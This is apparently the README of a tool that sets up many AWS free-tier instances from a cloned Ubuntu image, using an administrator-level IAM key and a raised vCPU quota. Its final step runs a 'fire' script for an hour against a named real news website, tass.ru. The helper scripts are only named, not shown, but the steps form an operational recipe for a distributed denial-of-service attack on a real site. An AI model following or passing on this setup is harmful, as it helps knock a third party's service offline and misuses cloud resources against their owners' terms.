1.	Go to https://aws.amazon.com/


2.	Create an account or Login to the existing one.


3.	Open https://console.aws.amazon.com/billing/home?#/account
	and scroll down to the AWS Regions section.
	Make sure Europe (Frankfurt) and Europe (Stockholm) are enabled.


4.	Open AWS IAM Users Configuration:
	https://console.aws.amazon.com/iamv2/home?#/users


5.	Create IAM user with AdministratorAccess rights:
	[ Add users ]
	Choose User Name
	Select AWS Credential Type
	[ Access key - Programmatic access ]
	[ Next ]
	[ Attach existing policies directly ]
	[x] AdministratorAccess
	[ Next ]
	Don't fill any Key/Value
	[ Next ]
	[ Create user ]


6.	Copy and save 'Access Key ID' & 'Secret Access Key'


7.	Install AWS CLI:
	https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html


8.	Run in Terminal:

	$ aws configure

	Paste Access Key ID
	Paste Secret Access Key

	The rest remains empty.


9.	Create and download key pairs.
	They will be saved as 'key-frankfurt-1.pem' and 'key-stockholm-1.pem':

	$ ./createKey.sh


10.	Create empty Ubuntu instances, they will be used as template images:

	$ ./createVanillaUbuntu.sh


11.	(optional) List IP addresses of online instances:

	$ ./listInstancesIPs.sh

	At this point there should be only two empty instances.
	If you have more instances created already, search for IPs by Instance ID,
	which is the first column. Instance IDs are printed at the previous step
	when you created an empty Ubuntu instances.


12.	Install necessary packages and shut down:

	$ ./remoteInstall.sh


13.	Create an image for the further usage:

	$ ./createImages.sh

	! Wait until it's ready. You can monitor the state for:
	Stockholm: https://eu-north-1.console.aws.amazon.com/ec2/v2/home?region=eu-north-1#Images:sort=name
	Frankfurt: https://eu-central-1.console.aws.amazon.com/ec2/v2/home?region=eu-central-1#Images:sort=name


14.	Start the instance agan (if needed):

	$ ./startTemplate.sh


15.	Clone images into new "Free tier eligible" instances. The parameter defines
	the number of new instances.
	Beware of vCPU limit. The default is 64 (32×2 CPU in case of t2/t3.micro)
	To request more vCPUs, visit http://aws.amazon.com/contact-us/ec2-request

	$ ./cloneTemplates.sh 15


16.	List IP addresses of all online instances.
	Beware, it takes time to bring the instance up.
	Wait a minute before the collecting of IP addresses.

	$ ./listInstancesIPs.sh

	Fill the list of IP addresses to the 'fire.sh', see the script for details.


17.	Make the fire (for an hour) to the website defined as parameter

	$ ./fire.sh https://tass.ru/
